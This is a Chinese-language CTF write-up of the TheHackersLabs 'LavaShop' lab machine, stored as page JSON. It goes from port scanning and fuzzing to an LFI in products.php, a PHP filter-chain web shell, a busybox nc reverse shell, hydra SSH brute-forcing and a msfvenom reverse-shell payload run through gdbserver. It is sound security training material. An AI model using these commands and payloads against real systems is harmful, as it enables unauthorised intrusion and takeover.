{"pageProps":{"postData":{"id":"TheHackersLabsLavaShop","contentHtml":"<h1>LavaShop</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/140\">https://labs.thehackerslabs.com/machine/140</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-python\">➜  LavaShop nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.129</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">34</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.129</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00051</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">1337</span>/tcp <span class=\"hljs-built_in\">open</span>  waste\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">18</span>:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">3.68</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">➜  LavaShop nmap -sT -A -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">1337</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.129</span>   \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">35</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.129</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00046</span>s latency).\n\nPORT     STATE SERVICE    VERSION\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh        OpenSSH <span class=\"hljs-number\">9.2</span>p1 Debian <span class=\"hljs-number\">2</span>+deb12u3 (protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">256</span> af:<span class=\"hljs-number\">79</span>:a1:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">80</span>:<span class=\"hljs-number\">45</span>:fb:b7:cb:<span class=\"hljs-number\">86</span>:fd:8b:<span class=\"hljs-number\">62</span>:<span class=\"hljs-number\">69</span>:4a:<span class=\"hljs-number\">64</span> (ECDSA)\n|_  <span class=\"hljs-number\">256</span> 6d:d4:9d:ac:0b:f0:a1:<span class=\"hljs-number\">88</span>:<span class=\"hljs-number\">66</span>:b4:ff:f6:<span class=\"hljs-number\">42</span>:bb:f2:e5 (ED25519)\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http       Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.62</span>\n|_http-title: Did <span class=\"hljs-keyword\">not</span> follow redirect to http://lavashop.thl/\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.62</span> (Debian)\n<span class=\"hljs-number\">1337</span>/tcp <span class=\"hljs-built_in\">open</span>  tcpwrapped\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">18</span>:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X, MikroTik RouterOS <span class=\"hljs-number\">7.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span> cpe:/o:mikrotik:routeros:<span class=\"hljs-number\">7</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5.6</span><span class=\"hljs-number\">.3</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.19</span>, OpenWrt <span class=\"hljs-number\">21.02</span> (Linux <span class=\"hljs-number\">5.4</span>), MikroTik RouterOS <span class=\"hljs-number\">7.2</span> - <span class=\"hljs-number\">7.5</span> (Linux <span class=\"hljs-number\">5.6</span><span class=\"hljs-number\">.3</span>)\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: Host: <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.46</span> ms <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.129</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">15.38</span> seconds\n</code></pre>\n<h3>枚举</h3>\n<p><code>80</code> 端口</p>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image1.png\" alt=\"image.png\"></p>\n<p>1337 端口</p>\n<pre><code class=\"hljs language-python\">➜  LavaShop echo <span class=\"hljs-string\">\"1234\"</span> | nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.129</span> <span class=\"hljs-number\">1337</span>\n(UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.129</span>] <span class=\"hljs-number\">1337</span> (?) : Connection refused\n</code></pre>\n<p>目录扫描</p>\n<pre><code class=\"hljs language-python\">➜  LavaShop feroxbuster --url http://lavashop.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt --<span class=\"hljs-built_in\">filter</span>-status <span class=\"hljs-number\">404</span>,<span class=\"hljs-number\">503</span>,<span class=\"hljs-number\">400</span> -x php,txt\n                                                                                                                  \n ___  ___  __   __     __      __         __   ___                                                                \n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__                                                                 \n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___                                                                \nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher 🤓                 ver: <span class=\"hljs-number\">2.11</span><span class=\"hljs-number\">.0</span>                                                                \n───────────────────────────┬──────────────────────                                                                \n 🎯  Target Url            │ http://lavashop.thl                                                                  \n 🚀  Threads               │ <span class=\"hljs-number\">50</span>                                             \n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n 💢  Status Code Filters   │ [<span class=\"hljs-number\">404</span>, <span class=\"hljs-number\">503</span>, <span class=\"hljs-number\">400</span>]\n 💥  Timeout (secs)        │ <span class=\"hljs-number\">7</span>\n 🦡  User-Agent            │ feroxbuster/<span class=\"hljs-number\">2.11</span><span class=\"hljs-number\">.0</span>\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [php, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ <span class=\"hljs-number\">4</span>\n 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n<span class=\"hljs-number\">404</span>      GET        <span class=\"hljs-number\">9l</span>       31w      274c Auto-filtering found <span class=\"hljs-number\">404</span>-like response <span class=\"hljs-keyword\">and</span> created new <span class=\"hljs-built_in\">filter</span>; toggle off <span class=\"hljs-keyword\">with</span> --dont-<span class=\"hljs-built_in\">filter</span>\n<span class=\"hljs-number\">403</span>      GET        <span class=\"hljs-number\">9l</span>       28w      277c Auto-filtering found <span class=\"hljs-number\">404</span>-like response <span class=\"hljs-keyword\">and</span> created new <span class=\"hljs-built_in\">filter</span>; toggle off <span class=\"hljs-keyword\">with</span> --dont-<span class=\"hljs-built_in\">filter</span>\n<span class=\"hljs-number\">200</span>      GET      <span class=\"hljs-number\">191l</span>      466w     4025c http://lavashop.thl/assets/css/styles.css\n<span class=\"hljs-number\">200</span>      GET       <span class=\"hljs-number\">45l</span>      105w     1539c http://lavashop.thl/index.php\n<span class=\"hljs-number\">301</span>      GET        <span class=\"hljs-number\">9l</span>       28w      312c http://lavashop.thl/pages => http://lavashop.thl/pages/\n<span class=\"hljs-number\">301</span>      GET        <span class=\"hljs-number\">9l</span>       28w      313c http://lavashop.thl/assets => http://lavashop.thl/assets/\n<span class=\"hljs-number\">301</span>      GET        <span class=\"hljs-number\">9l</span>       28w      315c http://lavashop.thl/includes => http://lavashop.thl/includes/\n<span class=\"hljs-number\">200</span>      GET       <span class=\"hljs-number\">45l</span>      105w     1539c http://lavashop.thl/\n<span class=\"hljs-number\">301</span>      GET        <span class=\"hljs-number\">9l</span>       28w      320c http://lavashop.thl/assets/images => http://lavashop.thl/assets/images/\n<span class=\"hljs-number\">301</span>      GET        <span class=\"hljs-number\">9l</span>       28w      317c http://lavashop.thl/assets/css => http://lavashop.thl/assets/css/\n<span class=\"hljs-number\">301</span>      GET        <span class=\"hljs-number\">9l</span>       28w      321c http://lavashop.thl/includes/pages => http://lavashop.thl/includes/pages/\n<span class=\"hljs-number\">200</span>      GET       <span class=\"hljs-number\">19l</span>       40w      698c http://lavashop.thl/includes/header.php\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">8l</span>       20w      424c http://lavashop.thl/includes/nav.php\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">5l</span>       27w      208c http://lavashop.thl/pages/about.php\n<span class=\"hljs-number\">200</span>      GET       <span class=\"hljs-number\">26l</span>       97w     1017c http://lavashop.thl/pages/products.php\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">8l</span>       23w      246c http://lavashop.thl/includes/pages/contact.php\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">4l</span>        7w      139c http://lavashop.thl/pages/contact.php\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">5l</span>       20w      195c http://lavashop.thl/pages/home.php\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">5l</span>       14w      105c http://lavashop.thl/includes/footer.php\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">6l</span>       26w      192c http://lavashop.thl/includes/pages/catalog.php\n<span class=\"hljs-number\">200</span>      GET        <span class=\"hljs-number\">4l</span>       30w      208c http://lavashop.thl/includes/pages/home.php\n</code></pre>\n<p>看着像是存在 LFI ，枚举一下 <code>index.php</code> 的 page 参数</p>\n<pre><code class=\"hljs language-python\">➜  LavaShop ffuf -u <span class=\"hljs-string\">'http://lavashop.thl/index.php?page=FUZZ'</span> -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt \n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://lavashop.thl/index.php?page=FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\nabout                   [Status: 200, Size: 1268, Words: 140, Lines: 41, Duration: 0ms]\ncontact                 [Status: 200, Size: 1199, Words: 115, Lines: 40, Duration: 0ms]\nhome                    [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 0ms]\nproducts                [Status: 200, Size: 2077, Words: 296, Lines: 62, Duration: 0ms]\n                        [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 4ms]\n:: Progress: [74332/74332] :: Job [1/1] :: 8333 req/sec :: Duration: [0:00:08] :: Errors: 0 ::\n</span></code></pre>\n<p>没有枚举出来，再枚举一下其他页面是否存在参数</p>\n<p>有点阴了，藏在 <code>products.php</code></p>\n<pre><code class=\"hljs language-python\">➜  LavaShop ffuf -u <span class=\"hljs-string\">'http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd'</span> -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -fs <span class=\"hljs-number\">1017</span>\n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 1017\n________________________________________________\n\nfile                    [Status: 200, Size: 2481, Words: 225, Lines: 55, Duration: 1ms]\n</span></code></pre>\n<p>成功包含</p>\n<pre><code class=\"hljs language-python\">➜  LavaShop curl <span class=\"hljs-string\">'http://lavashop.thl/pages/products.php?file=/etc/passwd'</span>                \n  &#x3C;section style=<span class=\"hljs-string\">\"margin-bottom:1.5rem; padding:1rem; background:rgba(0,0,0,.25); border:1px solid rgba(255,255,255,.1); border-radius:12px;\"</span>>\n    &#x3C;p style=<span class=\"hljs-string\">\"margin:0 0 .75rem;\"</span>>Incluyendo: &#x3C;code>/etc/passwd&#x3C;/code>&#x3C;/p>\n    &#x3C;pre style=<span class=\"hljs-string\">\"white-space:pre-wrap; overflow:auto; padding:.75rem; background:rgba(0,0,0,.35); border-radius:8px;\"</span>>\nroot:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/<span class=\"hljs-built_in\">bin</span>/bash\ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:/usr/sbin:/usr/sbin/nologin                                                                   \n<span class=\"hljs-built_in\">bin</span>:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:<span class=\"hljs-built_in\">bin</span>:/<span class=\"hljs-built_in\">bin</span>:/usr/sbin/nologin\nsys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:/dev:/usr/sbin/nologin\nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:/<span class=\"hljs-built_in\">bin</span>:/<span class=\"hljs-built_in\">bin</span>/sync                                                                                \ngames:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:/usr/games:/usr/sbin/nologin\nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:/var/cache/man:/usr/sbin/nologin                                                                   \nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:/var/mail:/usr/sbin/nologin\nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:/<span class=\"hljs-built_in\">bin</span>:/usr/sbin/nologin\nwww-data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www-data:/var/www:/usr/sbin/nologin\nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:/var/backups:/usr/sbin/nologin\n<span class=\"hljs-built_in\">list</span>:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing <span class=\"hljs-type\">List</span> Manager:/var/<span class=\"hljs-built_in\">list</span>:/usr/sbin/nologin\nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">65534</span>::/nonexistent:/usr/sbin/nologin\nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:<span class=\"hljs-number\">998</span>:<span class=\"hljs-number\">998</span>:systemd Network Management:/:/usr/sbin/nologin\nmessagebus:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">107</span>::/nonexistent:/usr/sbin/nologin\nsshd:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">65534</span>::/run/sshd:/usr/sbin/nologin\ndebian:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>:debian,,,:/home/debian:/<span class=\"hljs-built_in\">bin</span>/bash\nRodri:x:<span class=\"hljs-number\">1001</span>:<span class=\"hljs-number\">1001</span>::/home/Rodri:/<span class=\"hljs-built_in\">bin</span>/bash\n</code></pre>\n<h2>LFI</h2>\n<p>将用户 Rodri 拿去后台爆破</p>\n<pre><code class=\"hljs language-python\">LavaShop hydra -l Rodri -P /usr/share/wordlists/rockyou.txt -t <span class=\"hljs-number\">8</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.129</span> ssh\n</code></pre>\n<p>继续测试 LFI，可以使用伪协议</p>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image2.png\" alt=\"image.png\"></p>\n<p>能直接读 user.txt</p>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image3.png\" alt=\"image.png\"></p>\n<p>继续测试，尝试使用 <a href=\"https://github.com/synacktiv/php_filter_chain_generator\">https://github.com/synacktiv/php_filter_chain_generator</a></p>\n<pre><code class=\"hljs language-python\">python lfi.py --chain <span class=\"hljs-string\">'&#x3C;?php phpinfo();?>'</span>\n</code></pre>\n<p>成功执行</p>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image4.png\" alt=\"image.png\"></p>\n<p>反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-python\">python lfi.py --chain <span class=\"hljs-string\">'&#x3C;?php eval(system($_GET[\"x\"])); ?>  '</span>  \n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image5.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">x=busybox nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.5</span> <span class=\"hljs-number\">1234</span> -e /<span class=\"hljs-built_in\">bin</span>/bash\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image6.png\" alt=\"image.png\"></p>\n<h2>提权 - Rodri</h2>\n<p>查看进程可以看到后台有个 <code>gdbserver</code></p>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image7.png\" alt=\"image.png\"></p>\n<p>网上收集了几个 payload 这个能用：</p>\n<p><a href=\"https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbserver#pentesting-remote-gdbserver\">渗透测试远程 GdbServer - HackTricks --- Pentesting Remote GdbServer - HackTricks</a></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># Trick shared by @B1n4rySh4d0w</span>\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span> LPORT=<span class=\"hljs-number\">4444</span> PrependFork=true -f elf -o binary.elf\n\nchmod +x binary.elf\n\ngdb binary.elf\n\n<span class=\"hljs-comment\"># Set remote debuger target</span>\ntarget extended-remote <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.129</span>:<span class=\"hljs-number\">1337</span>\n\n<span class=\"hljs-comment\"># Upload elf file</span>\nremote put binary.elf binary.elf\n\n<span class=\"hljs-comment\"># Set remote executable file</span>\n<span class=\"hljs-built_in\">set</span> remote <span class=\"hljs-built_in\">exec</span>-file /home/Rodri/binary.elf\n\n<span class=\"hljs-comment\"># Execute reverse shell executable</span>\nrun\n\n<span class=\"hljs-comment\"># You should get your reverse-shell</span>\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image8.png\" alt=\"image.png\"></p>\n<h2>提权</h2>\n<p><code>root</code> 密码藏在环境变量里面</p>\n<p><img src=\"/post-images/TheHackersLabsLavaShop/image9.png\" alt=\"image.png\"></p>","title":"TheHackersLabs - LavaShop","date":"2025-10-20","updated":"2025-10-20","tags":["TheHackerLabs","Linux","LFI","Fuzz","Gdbserver"],"categories":"靶机","comments":true,"description":"LavaShop https://labs.thehackerslabs.com/machine/140 Recon PortScan 枚举 80 端口 1337 端口 目录扫描 看着像是存在 LFI ，枚举一下 index.php 的 page 参数 没有枚举出来，再枚举一下其他页面是否存在参数..."},"recentPosts":[{"id":"TheHackersLabsLuna","title":"TheHackersLabs - Luna","date":"2025-10-28","isEncrypted":false,"year":"2025","month":"10","day":"28"},{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"}]},"__N_SSG":true}